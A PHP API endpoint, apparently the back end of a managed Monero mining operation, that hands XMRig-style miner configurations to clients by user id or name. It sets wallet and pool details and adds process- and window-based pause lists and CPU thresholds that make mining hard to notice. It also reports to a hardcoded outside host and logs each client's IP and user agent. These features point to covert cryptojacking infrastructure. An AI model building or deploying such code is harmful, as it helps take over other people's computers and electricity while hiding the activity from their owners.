<?php
/**
 * 用户配置API
 * 根据用户ID或用户名获取配置
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

require_once '../config.php';

// 获取参数 - 支持多种方式
$userId = $_GET['id'] ?? '';          // 用户ID
$username = $_GET['user'] ?? '';      // 用户名
$token = $_GET['token'] ?? '';        // 可选的安全令牌

// 优先使用用户名，如果没有则使用ID
$identifier = !empty($username) ? $username : $userId;

if (empty($identifier)) {
    http_response_code(400);
    echo json_encode([
        'error' => 'Missing parameters',
        'message' => 'user or id parameter is required'
    ]);
    exit;
}

try {
    $db = getDB();
    
    // 查询用户信息
    if (is_numeric($identifier)) {
        // 按ID查询
        $stmt = $db->prepare("
            SELECT u.id, u.username, u.status 
            FROM users u 
            WHERE u.id = ?
        ");
        $stmt->execute([$identifier]);
    } else {
        // 按用户名查询
        $stmt = $db->prepare("
            SELECT u.id, u.username, u.status 
            FROM users u 
            WHERE u.username = ?
        ");
        $stmt->execute([$identifier]);
    }
    
    $user = $stmt->fetch();
    
    if (!$user) {
        http_response_code(404);
        echo json_encode([
            'error' => 'User not found',
            'message' => 'Invalid user identifier'
        ]);
        exit;
    }
    
    if ($user['status'] != 1) {
        http_response_code(403);
        echo json_encode([
            'error' => 'User disabled',
            'message' => 'User account is disabled'
        ]);
        exit;
    }
    
    // 获取用户的最新配置（默认获取XMR）
    $stmt = $db->prepare("
        SELECT 
            uc.config_data,
            uc.worker_name,
            c.name as coin_name,
            c.algorithm,
            c.public_config
        FROM user_configs uc
        JOIN coins c ON uc.coin_id = c.id
        WHERE uc.user_id = ? 
        AND uc.status = 1
        AND c.name = 'xmr'
        ORDER BY uc.updated_at DESC
        LIMIT 1
    ");
    $stmt->execute([$user['id']]);
    $config = $stmt->fetch();
    
    if (!$config) {
        // 如果没有配置，返回默认配置
        $defaultConfig = [
            "dry-run" => false,
            "background" => false,
            "cpu" => [
                "enabled" => true,
                "max-threads-hint" => 70,
                "yield" => true
            ],
            "opencl" => ["enabled" => false],
            "cuda" => ["enabled" => false],
            "pools" => [
                [
                    "url" => "pool.supportxmr.com:3333",
                    "user" => "YOUR_WALLET_ADDRESS",
                    "pass" => "x",
                    "keepalive" => true,
                    "tls" => false
                ]
            ],
            "donate-level" => 0,
            "print-time" => 60,
            "message" => "No configuration found for user, using default"
        ];
        
        echo json_encode($defaultConfig, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
    
    // 解析配置
    $publicConfig = json_decode($config['public_config'], true) ?: [];
    $userConfig = json_decode($config['config_data'], true) ?: [];
    
    // 合并配置
    $finalConfig = array_merge($publicConfig, [
        "worker-id" => $user['username'],
        "log-file" => $user['username'] . ".log"
    ]);
    
    // 处理矿池配置
    if (isset($finalConfig['pools']) && is_array($finalConfig['pools'])) {
        foreach ($finalConfig['pools'] as &$pool) {
            // 设置用户钱包
            if (isset($userConfig['wallet'])) {
                $pool['user'] = $userConfig['wallet'] . '.' . $user['username'];
            }
            
            // 设置算法
            if (!empty($config['algorithm'])) {
                $pool['algo'] = $config['algorithm'];
            }
        }
    }
    
    // 添加用户自定义的监控配置
    if (isset($userConfig['process_pause_names'])) {
        $finalConfig['process-pause-names'] = $userConfig['process_pause_names'];
    }
    
    if (isset($userConfig['window_pause_names'])) {
        $finalConfig['window-pause-names'] = $userConfig['window_pause_names'];
    }
    
    // 添加CPU控制参数
    $finalConfig['cpu-high-pause'] = $userConfig['cpu_high_pause'] ?? 95;
    $finalConfig['cpu-low-resume'] = $userConfig['cpu_low_resume'] ?? 30;
    $finalConfig['cpu-control-interval'] = $userConfig['cpu_control_interval'] ?? 3;
    $finalConfig['cpu-resume-delay'] = $userConfig['cpu_resume_delay'] ?? 30;
    
    // 添加上报配置
    $finalConfig['report-host'] = "serveris.lieshoubbs.com";
    $finalConfig['report-port'] = 8181;
    $finalConfig['report-path'] = "/cpu/api/collect.php";
    $finalConfig['report-token'] = $user['username'];
    
    // 记录配置获取日志（可选）
    $stmt = $db->prepare("
        INSERT INTO config_access_logs (user_id, ip, user_agent, created_at) 
        VALUES (?, ?, ?, NOW())
    ");
    $stmt->execute([
        $user['id'], 
        $_SERVER['REMOTE_ADDR'] ?? '', 
        $_SERVER['HTTP_USER_AGENT'] ?? ''
    ]);
    
    // 输出配置
    echo json_encode($finalConfig, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'error' => 'Server error',
        'message' => 'Internal server error occurred'
    ]);
}
?>